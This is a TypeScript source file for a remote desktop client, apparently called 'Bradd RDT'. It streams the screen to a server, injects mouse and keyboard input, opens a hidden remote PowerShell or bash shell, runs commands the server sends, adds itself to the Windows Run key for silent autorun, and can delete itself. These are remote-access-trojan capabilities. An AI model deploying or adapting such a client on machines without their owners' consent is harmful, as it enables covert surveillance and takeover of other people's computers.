import { io } from 'socket.io-client';
// @ts-ignore
import screenshot from 'screenshot-desktop';
import si from 'systeminformation';
import { spawn, exec, ChildProcess } from 'child_process';
import path from 'path';
import fs from 'fs';
import os from 'os';
import { RTCPeerConnection } from 'werift';

// Config
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:5000';
const CUSTOM_NAME = ''; // Will be replaced by builder
const CONFIG_FILE = path.join(os.homedir(), '.bradd-rdt-client-id');

console.log(`Client starting... Connecting to ${SERVER_URL}`);

// Get or Create Client ID
let clientId = '';
if (fs.existsSync(CONFIG_FILE)) {
    clientId = fs.readFileSync(CONFIG_FILE, 'utf-8').trim();
} else {
    clientId = require('crypto').randomUUID();
    fs.writeFileSync(CONFIG_FILE, clientId);
}
console.log(`Client ID: ${clientId}`);

const socket = io(SERVER_URL);
let streamInterval: NodeJS.Timeout | null = null;

// Helper function to extract and get helper path
function getInputHelperPath(): string {
    // Check if running in pkg
    // @ts-ignore
    if (process.pkg) {
        try {
            // In pkg, __dirname points to /snapshot/project/dist (since main is dist/index.js)
            // We ensure InputHelper.exe is copied to dist/ during build
            const internalPath = path.join(__dirname, 'InputHelper.exe');
            const tempPath = path.join(os.tmpdir(), 'bradd-rdt-input-helper.exe');
            
            // Always overwrite to ensure latest version
            fs.writeFileSync(tempPath, fs.readFileSync(internalPath));
            return tempPath;
        } catch (e) {
            console.error('Failed to extract InputHelper:', e);
            // Fallback
        }
    }

    // Dev / Normal node execution
    let devPath = path.join(__dirname, 'InputHelper.exe'); // src/InputHelper.exe
    if (fs.existsSync(devPath)) return devPath;
    
    devPath = path.join(process.cwd(), 'InputHelper.exe');
    if (fs.existsSync(devPath)) return devPath;

    return 'InputHelper.exe';
}

let inputHelperPath = getInputHelperPath();
console.log(`Input Helper Path: ${inputHelperPath}`);

// Persistent InputHelper Process
let inputProcess: ChildProcess | null = null;

function ensureInputProcess() {
    if (!inputProcess || inputProcess.killed) {
        try {
            console.log('Spawning persistent InputHelper process...');
            // @ts-ignore
            inputProcess = spawn(inputHelperPath, [], { 
                stdio: ['pipe', 'pipe', 'pipe'], // Don't inherit to avoid console window issues
                windowsHide: true // Hide the window
            });
            
            inputProcess.on('error', (err) => {
                console.error('InputHelper process error:', err);
                inputProcess = null;
            });

            inputProcess.stdin?.on('error', (err) => {
                console.error('InputHelper stdin error:', err);
                if (inputProcess) inputProcess.kill();
                inputProcess = null;
            });
            
            // Consume streams to prevent buffering/hanging
            inputProcess.stdout?.on('data', (data) => {
                const str = data.toString().trim();
                if (str && str !== 'pong') console.log('InputHelper:', str); 
            });
            inputProcess.stderr?.on('data', (data) => {
                console.error('InputHelper stderr:', data.toString());
            });

            inputProcess.on('exit', (code) => {
                console.warn('InputHelper process exited with code:', code);
                inputProcess = null;
            });
        } catch (e) {
            console.error('Failed to spawn InputHelper:', e);
        }
    }
}

// Ensure process starts
ensureInputProcess();

let screenWidth = 1920;
let screenHeight = 1080;

function setupAutorun() {
    // Only for Windows
    if (process.platform === 'win32') {
        // If packaged, use execPath. If dev, use process.cwd() + InputHelper (not ideal for dev autorun but ok)
        // We only really care about packaged for autorun usually.
        
        // @ts-ignore
        if (process.pkg) {
             const exePath = process.execPath;
             const keyName = 'BraddRDTClient';
             
             console.log('Configuring autorun for:', exePath);
             
             // Use HKCU Run key
             const cmd = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${keyName}" /t REG_SZ /d "${exePath}" /f`;
             
             exec(cmd, (err) => {
                 if (err) {
                     console.error('Failed to setup autorun:', err);
                 } else {
                     console.log('Autorun configured successfully.');
                 }
             });
        }
    }
}

async function main() {
    let hostname = 'Unknown';
    let platform = 'Unknown';
    try {
        const osInfo = await si.osInfo();
        hostname = CUSTOM_NAME || osInfo.hostname;
        platform = osInfo.platform;

        const graphics = await si.graphics();
        if (graphics.displays.length > 0) {
            screenWidth = graphics.displays[0].currentResX || 1920;
            screenHeight = graphics.displays[0].currentResY || 1080;
            console.log(`Screen Resolution: ${screenWidth}x${screenHeight}`);
        }
    } catch (e) {
        console.error("Error getting system info", e);
        hostname = CUSTOM_NAME || require('os').hostname();
        platform = require('os').platform();
    }
    
    console.log(`Identifying as ${hostname} (${platform})`);

    setupAutorun();

    if (socket.connected) {
        register();
    }
    
    socket.on('connect', () => {
        console.log('Connected to server ID:', socket.id);
        register();
    });

    socket.on('connect_error', (err) => {
        console.error('Connection error:', err.message);
    });

    function register() {
        socket.emit('register-client', {
            id: clientId,
            hostname: hostname,
            platform: platform
        });
    }

    let pc: RTCPeerConnection | null = null;
    let streamInterval: NodeJS.Timeout | null = null;
    let currentStreamId = 0;

    socket.on('start-stream', async (data) => {
        const { requester } = data; 
        console.log('Starting WebRTC stream for', requester);
        const myStreamId = ++currentStreamId;
        
        if (pc) {
            try { pc.close(); } catch(e) {}
        }
        if (streamInterval) clearInterval(streamInterval);

        const newPc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        pc = newPc;

        const dc = newPc.createDataChannel('screen');
        
        // Start sending frames when channel is open
        dc.stateChanged.subscribe((state) => {
             // console.log('DataChannel state:', state);
             if (state === 'open' && myStreamId === currentStreamId) {
                 // Use recursive loop instead of setInterval to prevent queue buildup
                const runLoop = async () => {
                    if (myStreamId !== currentStreamId || dc.readyState !== 'open') return;

                    // Flow control: Backpressure check
                    // If we have buffered data, wait for it to drain before capturing new frame
                    // This prevents "8 second delay" by dropping frames at the source
                    if (dc.bufferedAmount > 1024 * 16) { // > 16KB (very strict)
                        setTimeout(runLoop, 5); // Check again soon
                        return;
                    }

                    try {
                        const start = Date.now();
                        // Capture screenshot
                        const img = await screenshot({ format: 'jpg', quality: 75 }); 
                        
                        // Send immediately
                        dc.send(img);

                        // Maintain max ~30 FPS
                        const dur = Date.now() - start;
                        const delay = Math.max(0, 33 - dur);
                        setTimeout(runLoop, delay);
                    } catch (err) {
                        console.error('Screenshot/Send error:', err);
                        setTimeout(runLoop, 100); // Backoff on error
                    }
                };

                runLoop();
             }
        });

        newPc.iceConnectionStateChange.subscribe((state) => {
             console.log('ICE State:', state);
             if (state === 'disconnected' || state === 'failed' || state === 'closed') {
                 if (streamInterval && myStreamId === currentStreamId) clearInterval(streamInterval);
             }
        });

        newPc.onIceCandidate.subscribe((candidate) => {
             if (candidate && myStreamId === currentStreamId) {
                socket.emit('ice-candidate', { target: requester, candidate });
             }
        });

        // Create Offer
        try {
            const offer = await newPc.createOffer();
            if (myStreamId !== currentStreamId) return; // Abort if cancelled
            
            await newPc.setLocalDescription(offer);
            socket.emit('offer', { target: requester, sdp: offer });
        } catch (e) {
            console.error('Error creating offer:', e);
            return;
        }

        // Handle signaling
        const onAnswer = async (ansData: any) => {
            if (ansData.source === requester && myStreamId === currentStreamId) {
                try {
                    await newPc.setRemoteDescription(ansData.sdp);
                } catch (e) {
                    console.error('Error setting remote description:', e);
                }
            }
        };
        
        const onCandidate = async (candData: any) => {
             if (candData.source === requester && myStreamId === currentStreamId) {
                 try {
                     await newPc.addIceCandidate(candData.candidate);
                 } catch (e) {
                     console.error('Error adding candidate:', e);
                 }
             }
        };

        socket.off('answer');
        socket.off('ice-candidate');
        socket.on('answer', onAnswer);
        socket.on('ice-candidate', onCandidate);
    });

    socket.on('stop-stream', () => {
        console.log('Stopping stream');
        currentStreamId++; // Invalidate pending
        if (streamInterval) clearInterval(streamInterval);
        if (pc) {
            try { pc.close(); } catch(e) {}
            pc = null;
        }
    });

    socket.on('input', (data) => {
        const now = Date.now();
        console.log(`[${now}] Input received: ${data.type}`);
        handleInput(data);
    });
    
    // Handle remote commands
    // Persistent Shell Session
let shellProcess: ChildProcess | null = null;

socket.on('start-term', async () => {
    if (shellProcess) return;

    console.log('Starting terminal session...');
    
    // Check admin
    const checkAdmin = () => new Promise<boolean>(resolve => {
        if (process.platform !== 'win32') return resolve(false); 
        exec('net session', (err) => {
            resolve(!err);
        });
    });

    const isAdmin = await checkAdmin();
    const statusMsg = isAdmin 
        ? '\r\n\x1b[32m[Running as Administrator]\x1b[0m\r\n' 
        : '\r\n\x1b[33m[Running as User - Restart client as Admin for full privileges]\x1b[0m\r\n';
    
    socket.emit('term-data', statusMsg);

    if (process.platform === 'win32') {
                // Use cmd.exe wrapping powershell or just powershell with windowsHide
                shellProcess = spawn('powershell.exe', ['-NoLogo'], { 
                    shell: false,
                    windowsHide: true
                });
            } else {
                shellProcess = spawn('bash', ['-i'], { 
                    shell: false,
                    windowsHide: true
                });
            }
            
            if (shellProcess.stdin) {
                shellProcess.stdin.setDefaultEncoding('utf-8');
            }

    shellProcess.stdout?.on('data', (data) => {
        socket.emit('term-data', data.toString());
    });

    shellProcess.stderr?.on('data', (data) => {
        socket.emit('term-data', data.toString());
    });

    shellProcess.on('exit', () => {
        shellProcess = null;
        socket.emit('term-data', '\r\nShell exited.\r\n');
    });
});

socket.on('term-input', (data) => {
    // console.log('Term input received:', JSON.stringify(data));
    if (shellProcess && shellProcess.stdin) {
        try {
            shellProcess.stdin.write(data);
        } catch (e) {
            console.error('Write to shell failed:', e);
        }
    }
});

socket.on('term-resize', (size: { cols: number, rows: number }) => {
    // Standard spawn doesn't support resize, ignoring for now.
    // Ideally use node-pty for resize support.
});

socket.on('command', (data: { command: string, args?: string[], source: string }) => {
        console.log('Received command:', data.command);
        if (data.command === 'uninstall') {
            console.log('Uninstalling client...');
            
            // Kill child processes
            if (inputProcess) inputProcess.kill();
            if (shellProcess) shellProcess.kill();

            // Remove Autorun
            if (process.platform === 'win32') {
                 exec('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "BraddRDTClient" /f', () => {});
            }

            // Delete Config
            try {
                if (fs.existsSync(CONFIG_FILE)) {
                    fs.unlinkSync(CONFIG_FILE);
                }
            } catch (e) {
                console.error('Failed to delete config:', e);
            }

            // Self-delete (Only if packaged)
            // @ts-ignore
            if (process.pkg) {
                const scriptPath = path.join(os.tmpdir(), 'cleanup.bat');
                const exePath = process.execPath;
                
                const scriptContent = `
@echo off
timeout /t 2 /nobreak > NUL
del "${exePath}"
del "%~f0"
`;
                fs.writeFileSync(scriptPath, scriptContent);
                spawn('cmd.exe', ['/c', scriptPath], { detached: true, stdio: 'ignore' });
            }

            setTimeout(() => process.exit(0), 500);
        } else {
             // Shell command
            const child = spawn(data.command, data.args || [], { shell: true });
            
            child.stdout.on('data', (chunk) => {
                socket.emit('command-result', { target: data.source, output: chunk.toString() });
            });
            child.stderr.on('data', (chunk) => {
                socket.emit('command-result', { target: data.source, output: chunk.toString() });
            });
        }
    });

    socket.on('disconnect', () => {
        console.log('Disconnected from server');
        if (streamInterval) clearInterval(streamInterval);
    });
    
    process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Keep process alive
setInterval(() => {}, 60000);

// Keep InputHelper alive and check health
setInterval(() => {
    if (inputProcess && inputProcess.stdin) {
        try {
            inputProcess.stdin.write('ping\n');
        } catch (e) {
            console.error('InputHelper ping failed:', e);
            if (inputProcess) inputProcess.kill();
            inputProcess = null;
        }
    }
}, 30000);
}

function handleInput(data: any) {
    // data: { type: 'move'|'click'|'type'|'scroll', x, y, button, text, amount }
    
    let args: string[] = [];
    if (data.type === 'move') {
        let x = data.x;
        let y = data.y;

        // If normalized (0-1), scale to screen size
        // We assume if x is small (< 2) it's normalized, unless it's exactly 0 or 1 pixel which is rare/edge
        // Better: frontend should just always send normalized? 
        // Let's support both.
        if (x <= 1 && y <= 1) {
            x = Math.round(x * screenWidth);
            y = Math.round(y * screenHeight);
        } else {
            x = Math.round(x);
            y = Math.round(y);
        }

        args = ['move', x.toString(), y.toString()];
    } else if (data.type === 'mousedown') {
        args = ['mousedown', data.button || 'left'];
    } else if (data.type === 'mouseup') {
        args = ['mouseup', data.button || 'left'];
    } else if (data.type === 'click') {
        if (data.x !== undefined && data.y !== undefined) {
             let x = data.x;
             let y = data.y;
             if (x <= 1 && y <= 1) {
                 x = Math.round(x * screenWidth);
                 y = Math.round(y * screenHeight);
             } else {
                 x = Math.round(x);
                 y = Math.round(y);
             }
             args = ['click_at', x.toString(), y.toString(), data.button || 'left'];
        } else {
             args = ['click', data.button || 'left'];
        }
    } else if (data.type === 'scroll') {
        args = ['scroll', (data.amount || 0).toString()];
    } else if (data.type === 'type') {
        args = ['type', data.text];
    }

    if (args.length > 0) {
        // spawn(inputHelperPath, args);
        ensureInputProcess();
        if (inputProcess && inputProcess.stdin) {
            const commandLine = args.join(' ') + '\n';
            try {
                inputProcess.stdin.write(commandLine);
            } catch (e) {
                console.error('Error writing to InputHelper stdin:', e);
                // Try restarting
                inputProcess.kill();
                inputProcess = null;
            }
        }
    }
}

main();
